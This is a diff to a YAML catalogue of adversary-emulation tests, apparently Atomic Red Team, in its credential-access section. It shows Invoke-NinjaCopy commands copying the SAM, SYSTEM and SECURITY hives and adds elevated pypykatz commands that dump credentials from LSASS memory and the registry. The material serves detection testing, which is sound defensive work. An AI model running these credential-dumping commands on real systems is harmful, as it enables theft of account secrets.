@@ -19977,10 +19977,38 @@ credential-access:
           Invoke-NinjaCopy -Path "#{sam_binary_path}" -LocalDestination "#{output_folder}\sam"
           Invoke-NinjaCopy -Path "#{system_binary_path}" -LocalDestination "#{output_folder}\system"
           Invoke-NinjaCopy -Path "#{security_binary_path}" -LocalDestination "#{output_folder}\security"
-        cleanup_command: |-
+        cleanup_command: |
           rm "#{output_folder}\sam"
           rm "#{output_folder}\system"
           rm "#{output_folder}\security"
+    - name: LSASS read with pypykatz
+      description: |
+        Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::
+        #https://github.com/skelsec/pypykatz and it's dependencies must be installed
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        prereq_command: 'py -3
+
+'
+        command: 'pypykatz live lsa
+
+'
+    - name: Registry parse with pypykatz
+      description: |
+        Parses registry hives to obtain stored credentials
+        #https://github.com/skelsec/pypykatz and it's dependencies must be installed
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        prereq_command: 'py -3
+
+'
+        command: pypykatz live registry
   T1081:
     technique:
       x_mitre_permissions_required:
